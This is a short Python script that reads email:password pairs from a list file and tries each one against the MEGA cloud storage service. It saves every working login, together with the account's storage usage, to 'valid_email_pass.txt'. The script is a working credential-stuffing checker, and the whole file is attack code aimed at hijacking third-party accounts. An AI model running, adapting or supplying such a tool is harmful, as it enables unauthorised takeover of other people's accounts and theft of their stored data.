from mega import Mega

def format_bytes(size):
	power = 2**10
	n = 0
	units = ['B', 'KB', 'MB', 'GB', 'TB']
	while size > power:
		size /= power
		n += 1
	return f"{size:.2f} {units[n]}"

filename = "mylist.txt"

with open(filename, "r") as file:
	for line in file:
		line = line.strip()
		email, password = line.split(":")
		try:
			mega = Mega()
			m = mega.login(email, password)
			print("Login successful for email: " + email)
			space_info = m.get_storage_space()
			used_space = format_bytes(space_info['used'])
			total_space = format_bytes(space_info['total'])
			print(f"Storage space used: {used_space}")
			print(f"Total storage space: {total_space}")
			with open("valid_email_pass.txt", "a") as file:
				file.write(f"{email}\n{password}\nStorage space used: {used_space}\nTotal storage space: {total_space}\n--------------------\n")
		except ValueError:
			print("Login failed for email: " + email + ", invalid email or password")
		except Exception as e:
			print("Login failed for email: " + email + ", error: " + str(e))